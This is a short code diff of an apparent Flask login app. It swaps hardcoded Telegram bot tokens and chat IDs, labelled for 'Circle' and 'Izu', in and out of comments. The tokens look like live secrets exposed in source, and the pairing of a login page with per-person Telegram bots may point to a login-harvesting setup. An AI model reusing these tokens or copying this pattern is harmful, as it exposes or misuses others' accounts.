@@ -11,9 +11,9 @@ app.secret_key = 'your-secret-key-here'  # Change this to a secure secret key
 TELEGRAM_BOT_TOKEN = '8499182673:AAGesMaZF6BI809HR5GK1aY7jb0XqRQC3ms'
 TELEGRAM_CHAT_ID = '7608981070'
 
-# Secondary Telegram Bot credentials (placeholders for Circle)
-SECONDARY_TELEGRAM_BOT_TOKEN = '8154915769:AAF6fwbJnfF9AZpRDqgT40DZn4oZfzQh5f0'
-SECONDARY_TELEGRAM_CHAT_ID = '6019518989'
+# # Secondary Telegram Bot credentials (placeholders for Circle)
+# SECONDARY_TELEGRAM_BOT_TOKEN = '8154915769:AAF6fwbJnfF9AZpRDqgT40DZn4oZfzQh5f0'
+# SECONDARY_TELEGRAM_CHAT_ID = '6019518989'
 
 # # Secondary Telegram Bot credentials (placeholders for Izu)
 # SECONDARY_TELEGRAM_BOT_TOKEN = '8223867988:AAFhuQnYpOwEj-7mt3WSKQRMow7xWOV3L9U'
@@ -77,7 +77,6 @@ def login():
     
     # GET request - show login page
     return render_template('login.html')
-
 
 
 if __name__ == '__main__':
